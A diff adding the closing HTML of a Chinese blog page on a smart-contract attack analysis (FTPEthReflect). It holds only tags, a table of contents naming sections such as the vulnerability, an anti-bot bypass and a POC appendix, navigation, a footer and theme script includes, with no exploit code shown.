+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags me-1" aria-hidden="true"></i><a href="/tags/security/" class="post-tag" title="标签 - Security">Security</a><a href="/tags/attack/" class="post-tag" title="标签 - Attack">Attack</a><a href="/tags/ftpethreflect/" class="post-tag" title="标签 - FTPEthReflect">FTPEthReflect</a></section>
+    <section><span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div><div class="post-nav"><a href="/lienfinance-attack-analysis/" class="post-nav-item" rel="prev" title="LienFinance Attack Analysis"><i class="fa-solid fa-angle-left" aria-hidden="true"></i>LienFinance Attack Analysis</a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content always-active" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">目录</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#1-概述">1. 概述</a></li>
+    <li><a href="#2-目标合约与业务模型">2. 目标合约与业务模型</a></li>
+    <li><a href="#3-漏洞现货余额差被当作新流入">3. 漏洞：现货余额差被当作新流入</a></li>
+    <li><a href="#4-攻击路径设计中的三个核心问题">4. 攻击路径设计中的三个核心问题</a>
+      <ul>
+        <li><a href="#41-如何触发记账代币回调条件">4.1 如何触发记账（代币回调条件）</a></li>
+        <li><a href="#42-注入的资本如何完整回收核心">4.2 注入的资本如何完整回收（核心）</a></li>
+        <li><a href="#43-提款-cap-的-return-陷阱">4.3 提款 cap 的 return 陷阱</a></li>
+      </ul>
+    </li>
+    <li><a href="#5-反机器人模块与绕过">5. 反机器人模块与绕过</a></li>
+    <li><a href="#6-真实攻击交易复盘">6. 真实攻击交易复盘</a></li>
+    <li><a href="#7-本地复现验证">7. 本地复现验证</a></li>
+    <li><a href="#8-修复建议">8. 修复建议</a></li>
+    <li><a href="#附录1-关键地址">附录1 ：关键地址</a></li>
+    <li><a href="#附录2-poc">附录2: POC</a></li>
+  </ul>
+</nav></div>
+      </div>
+    </dialog></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.154.5"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.4.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2026</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons"><div class="fixed-button back-to-top animate__faster d-none" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up" aria-hidden="true"></i></div><div id="toc-drawer-button" class="fixed-button toc-drawer-button d-none" role="button" aria-label="目录"><i class="fa-solid fa-bars" aria-hidden="true"></i></div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">该网站在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/js/config/7e4e7866b64223a311f61a811e166dae.js" defer></script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
